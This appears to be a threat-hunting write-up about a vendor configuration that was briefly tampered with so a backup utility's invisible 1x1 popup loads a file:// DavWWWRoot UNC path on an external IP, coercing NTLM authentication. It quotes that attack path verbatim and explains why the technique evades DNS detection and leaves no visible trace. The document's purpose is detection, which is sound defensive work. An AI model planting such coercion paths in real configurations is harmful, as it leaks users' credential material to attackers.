# H390

The credential theft was hiding in a promotional banner.

AOMEI's notification component reads a configuration file from the vendor and renders whatever popups it describes. For a five-minute window on 20 July 2026, that file told it to render a window one pixel wide and one pixel tall, at priority 9999, pointed at `file://8.210.84.56/DavWWWRoot/campaign/24hour-flash-sale.html`.

Nothing appeared on screen. `DavWWWRoot` is the Windows WebDAV redirector keyword, so the `file://` UNC path resolved out over HTTP, and Windows did what it always does with a UNC path it is asked to reach: it authenticated. NetNTLMv2 material went to an address in someone else's hands, and the user saw a banner that never drew.

What makes this worth its own hunt is where the evidence is, rather than how clever the trick is.

The tampering itself is essentially unhuntable from a customer's position. UNC7017 modified the vendor's own configuration files in bursts — 10 minutes on 28 May, 6 minutes on 16 July, 5 minutes on 20 July — and reverted them to authentic content at the end of each one. Mandiant is blunt about the effect: it "hinders post-incident vendor audits, minimizes the window for network defenders to capture live malicious server responses, and restricts compromise to clients polling for updates during those exact minutes." You cannot hunt a file that was correct before the event and correct after it, on a server you do not own.

The coerced authentication is different. It happened on the endpoint, and it left a connection record and an NTLM authentication attempt in telemetry that lives for weeks.

The query is also unusually clean, because the discriminator is the *process*, not the destination. Internal WebDAV and SMB authentication is constant and normal — SharePoint, OneDrive, mapped drives, print servers, software distribution. But a backup utility reaching out to a bare IP address on the internet to authenticate is not a thing that happens. Scope to external destinations, subtract browsers, Explorer, Office and the Microsoft 365 endpoints, and what remains is a short list.

Two details decide whether the hunt actually fires.

A UNC path containing a literal IP generates no DNS query at all. There is no domain to match, no newly-registered-domain heuristic to trip, nothing for a DNS-based hunt to see. The detection has to sit on connection or authentication telemetry.

And both ports belong in the query. `DavWWWRoot` routes the fetch over HTTP through the WebClient service, but if WebClient is stopped the attempt can fall back to plain SMB on 445. On most networks outbound 445 is already denied at the perimeter — in which case the firewall's denial log is the detection, and the endpoint telemetry is what tells you which process tried.

## Why

- **The endpoint telemetry is the only place this is visible.** The tampered configuration lived on the vendor's servers for minutes and was reverted, so the coerced authentication is the one artefact a customer can actually hunt.
- **The initiating process is a far better discriminator than the destination.** Internal WebDAV and SMB are everywhere; a desktop backup or remote-access utility authenticating to an external bare IP is not.
- **Nothing was shown to the user, by design.** A 1x1 window at priority 9999 renders ahead of legitimate notifications and draws nothing, so there is no prompt, no visible dialog and no reason for anyone to report it.
- **No vulnerability was exploited on the endpoint.** The application did exactly what its configuration told it to do, which means patch state, exploit mitigations and application allowlisting all offer no protection and leave no trace.
- **A literal IP in a UNC path defeats DNS-based detection entirely.** There is no lookup to see, which is precisely why the hunt is built on connection and NTLM authentication telemetry instead.
- **`DavWWWRoot` is a distinctive string with few benign appearances.** It is the WebDAV redirector keyword, and its presence in a URL, command line or configuration is worth a query on its own.
- **Victimology is opportunistic, so absence from a victim list means nothing.** Mandiant notes the campaign targeted any system polling during the windows, so installed-software inventory is the better scoping question than threat intelligence matching.
- **It is the inverse of HEARTH's existing coercion coverage.** [[H161]] and [[H293]] hunt an attacker already inside the network coercing a server; here a trusted application coerces its own host because of a change made upstream at the vendor.
- **Perimeter denial of outbound 445 turns the attack into its own alarm.** Where that control exists, the firewall log records the attempt, and the value of the hunt shifts to identifying which process and which configuration caused it.
